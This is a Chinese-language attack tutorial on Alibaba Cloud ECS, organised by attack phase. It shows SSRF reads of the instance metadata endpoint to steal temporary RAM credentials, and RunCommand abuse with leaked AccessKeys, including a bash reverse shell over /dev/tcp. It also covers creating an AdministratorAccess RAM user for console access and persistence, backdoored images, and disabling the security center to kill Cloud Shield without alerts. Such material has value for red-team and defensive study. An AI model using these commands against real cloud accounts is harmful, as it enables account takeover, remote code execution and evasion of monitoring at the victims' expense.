---
title: 阿里云 ECS 弹性计算服务攻防
id: aliyun_ecs
---

关于VPC的概念还请看：https://zone.huoxian.cn/d/985

<!-- more -->

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-07/1649324658-933864-image.png)



## 一、初始化访问

### 1、元数据

#### 1.1、SSRF导致读取元数据

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173443752.(null))

如果管理员给ECS配置了RAM角色，那么就可以获得临时凭证

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173523282.(null))

**如果配置RAM角色**

在获取ram临时凭证的时候，有一个必要的条件

- 当前ECS必须被授予了RAM

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173530221.(null))

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173532624.(null))

首先我们来看一下没有授予权限的机器

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173535779.(null))

访问这个目录后就会显示404，接下来我们配置好权限之后在请求一次

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173538937.(null))

- 注意
  - 如果管理员在配置RAM权限的时候选择的角色为服务，那么就没办法用该账号访问别的

- 如果权限较小的话，也无法进行更多的横向操作

### 2、AK密钥泄露

云场景下的凭证泄露可以分成以下几种：

- 控制台账号密码泄露，例如登录控制台的账号密码

- 临时凭证泄露

- 访问密钥泄露，即 AccessKeyId、SecretAccessKey 泄露

- 实例登录凭证泄露，例如 AWS 在创建 EC2 生成的证书文件遭到泄露

对于这类凭证信息的收集，一般可以通过以下几种方法进行收集：

- Github 敏感信息搜索

- 反编译目标 APK、小程序

- 目标网站源代码泄露

#### 2.1、执行任意命令

首先如果使用Aliyun的CLi作为演示

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173544710.(null))

```Nginx
aliyun ecs DescribeInstances
```

我们使用该命令来获取所有的ECS信息，并输出到ecs.json文件中

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173548540.(null))

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173552963.(null))

我们可以看到这里有一个`InstanceId`

随后使用下面的命令，可以在ECS上执行命令

```Apache
aliyun ecs RunCommand --InstanceId.1 i-2ze2sfmwdrs1z5xxoumk --RegionId cn-beijing --Type RunShellScript --CommandContent "touch /tmp/UzJu"
```

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173557191.(null))

#### 2.2、反弹shell

在新服务器中开启NC

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407174318743.(null))

```Apache
 aliyun ecs RunCommand --InstanceId.1 i-2ze2sfmwdrs1z5xxoumk --RegionId cn-beijing --Type RunShellScript --CommandContent "bash -c 'exec bash -i &>/dev/tcp/ip/port <&1'"
```

随后使用aliyun cli输入命令

![image-20220407173635773](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220407173635773.png)

#### 2.3、创建RAM账号登录控制台

获取到泄露的AK之后，可以通过写入RAM账户登录

首先在aliyun cli中配置泄露的AKID等信息

##### 2.3.1、GetAccountAlias接口

通过调用GetAccountAlias接口查看账号别名

> 官方文档地址：https://help.aliyun.com/document_detail/28737.html

```Nginx
aliyun ram GetAccountAlias
```

![image-20220407173618740](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220407173618740.png)

##### 2.3.2、CreateUser

调用CreateUser接口创建一个RAM用户

```Nginx
aliyun ram CreateUser --UserName xxx
```

![image-20220407173649000](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220407173649000.png)

##### 2.3.3、CreateLoginProfile

调用CreateLoginProfile接口为一个RAM用户启动Web控制台登录

```Nginx
aliyun ram CreateLoginProfile --UserName xxx --Password xxxx
```

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173657197.(null))

##### 2.3.4、AttachPolicyToUser

调用AttachPolicyToUser接口为指定用户添加权限

```Nginx
aliyun ram AttachPolicyToUser --PolicyType System --PolicyName AdministratorAccess --UserName xxx
```

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173701279.(null))

##### 2.3.5、登录控制台

在登录控制台的时候我们需要在用户名的后面加上一个@符号，后面跟上域名等，那么此时我们没有域名应该如何登陆？

我们只需要使用以下命令获取到ID放在@符号后边即可

```Nginx
aliyun ram GetAccountAlias
```

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173705690.(null))

![image-20220407173729483](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220407173729483.png)

### 3、恶意的镜像

获取控制台权限后，可导入存在后门的镜像

![image-20220407173748527](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220407173748527.png)

下次目标用户在选用镜像创建实例的时候，就会触发我们在镜像中植入的恶意代码了。

## 三、命令执行

### 1、接管控制台

在上文中我们提到关于RAM用户权限比较小的时候，我们没办法登录控制台，但是如果权限足够的情况，能否登录控制台

我们知道了，如果想让ECS中的元数据有RAM这个目录，我们必须给ECS授权RAM角色

![image-20220407173803269](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220407173803269.png)

例如我们现在并没有给ECS授权RAM角色，那么我们请求元数据地址看看是否还是404

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173810321.(null))

尝试给ECS授权RAM角色，在创建角色的时候，有三个选项，这里尝试前两个

- 阿里云账号

- 阿里云服务

首先我们来看一下阿里云账号

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173822372.(null))

随后创建完成需要给角色授权

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173825491.(null))

此时我们选择所有阿里云资源权限

![image-20220407173840081](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220407173840081.png)

随后来到ECS添加授权会发现无法添加

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173846603.(null))

既然这样，在选择角色的时候如果选择阿里云服务

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173851447.(null))

随后选择一样的权限

![image-20220407173904778](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220407173904778.png)

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173909409.(null))

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407174338634.(null))

然后回到ECS中，请求元数据看是否存在RAM目录

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173912236.(null))

在不知道ram角色名的情况下，如果请求/ram/security-credentials/目录，则会返回RAM角色名

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173916574.(null))

此时我们再请求Service即可获得临时凭证

![image-20220407173929932](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220407173929932.png)

**采坑**

这里在尝试的时候一直会有一个问题，我们配置好上图获取到的AKID和SECRET之后配置到aliyun cli会发现需要一个SecurityToken参数

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407174327892.(null))

这里的解决办法就是在配置的时候加上一个`--mode`参数即可

```Nginx
aliyun configure --mode StsToken
```

![image-20220407173943885](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220407173943885.png)

随后我们创建新的RAM角色登录控制台

#### 1.1、创建RAM角色账户登录控制台

##### 1、GetAccountAlias

通过调用GetAccountAlias接口查看账号别名

> 官方文档地址：https://help.aliyun.com/document_detail/28737.html

```Nginx
aliyun ram GetAccountAlias
```

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173951327.(null))

##### 2、CreateUser

调用CreateUser接口创建一个RAM用户

```Nginx
aliyun ram CreateUser --UserName xxx
```

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173954688.(null))

##### 3、CreateLoginProfile

调用CreateLoginProfile接口为一个RAM用户启动Web控制台登录

```Nginx
aliyun ram CreateLoginProfile --UserName xxx --Password xxxx
```

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407173958388.(null))

##### 4、AttachPolicyToUser

调用AttachPolicyToUser接口为指定用户添加权限

```Nginx
aliyun ram AttachPolicyToUser --PolicyType System --PolicyName AdministratorAccess --UserName xxx
```

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407174002480.(null))

##### 5、登录控制台

此时有一个疑惑，在登录控制台的时候我们需要在用户名的后面加上一个@符号，后面跟上域名等，那么此时我们没有域名应该如何登陆？

```Nginx
aliyun ram GetAccountAlias
```

使用该命令我们可以获取到一串数字，AccountAlias，随后把这串数字放到用户名的后面即可

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407174005122.(null))

随后输入我们设置的密码即可

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407174009166.(null))

随后我们成功登录了控制台

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407174013557.(null))

##### 6、注意

如果我们获取到的临时凭据在权限很小的时候，是无法创建RAM用户登录控制台的

![](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageUzJuMarkDownImageimage-20220407174026473.png)

## 四、权限维持

### 1 、云函数

通过云函数的方式创建后门

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407174044467.(null))

### 2、后门镜像

获取控制台权限后，可导入存在后门的镜像

![image-20220407174110830](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220407174110830.png)

下次目标用户在选用镜像创建实例的时候，就会触发我们在镜像中植入的恶意代码了。

### 3、创建访问密钥

##### 4.4.1、通过创建新的RAM角色登录控制台

###### 1、GetAccountAlias

通过调用GetAccountAlias接口查看账号别名

> 官方文档地址：https://help.aliyun.com/document_detail/28737.html

```Nginx
aliyun ram GetAccountAlias
```

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407174116132.(null))

###### 2、CreateUser

调用CreateUser接口创建一个RAM用户

```Nginx
aliyun ram CreateUser --UserName xxx
```

![image-20220407174133229](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220407174133229.png)

###### 3、CreateLoginProfile

调用CreateLoginProfile接口为一个RAM用户启动Web控制台登录

```Nginx
aliyun ram CreateLoginProfile --UserName xxx --Password xxxx
```

![image-20220407174146287](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220407174146287.png)

###### 4、AttachPolicyToUser

调用AttachPolicyToUser接口为指定用户添加权限

```Nginx
aliyun ram AttachPolicyToUser --PolicyType System --PolicyName AdministratorAccess --UserName xxx
```

![image-20220407174201585](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220407174201585.png)

###### 5、登录控制台

此时有一个疑惑，在登录控制台的时候我们需要在用户名的后面加上一个@符号，后面跟上域名等，那么此时我们没有域名应该如何登陆？

```Nginx
aliyun ram GetAccountAlias
```

使用该命令我们可以获取到一串数字，AccountAlias，随后把这串数字放到用户名的后面即可

![image-20220407174211567](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImageimage-20220407174211567.png)

随后输入我们设置的密码即可

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407174216239.(null))

随后我们成功登录了控制台

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407174219896.(null))



## 五、防御绕过

### 1、关闭安全监控服务

正常我们是没有办法直接结束进程阿里云的云盾的(ROOT用户也不行）

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407174237583.(null))

如果我们强制Kill就会收到告警

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407174242940.(null))

可以在云安全中心把所有的监控都关了，然后就可以kill掉这个进程了

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407174246220.(null))

并且我们不会收到告警

## 六、信息收集

### 1、元数据

在阿里云ECS常见下可以直接请求：http://100.100.100.200/latest/meta-data/ ，来获取元数据

![img](https://uzjumakdown-1256190082.cos.ap-guangzhou.myqcloud.com/UzJuMarkDownImage(null)-20220407174251192.(null))

**tIps**

有时候我们请求http://100.100.100.200/latest/meta-data/会发现返回404，这是因为没有配置Ram用户

> 详情请看【命令执行那一栏】

### 2、子网信息

在进行横向移动时，如果知道目标存在哪些网段可以起到事半功倍的效果，在云场景下，可以直接通过控制台看到目标的网段情况。

## 七、横向移动

### 1、访问凭证

当拿到目标的临时访问凭证或者访问密钥后，可以通过命令行或者也可以通过控制台的方式进行内网横向移动。
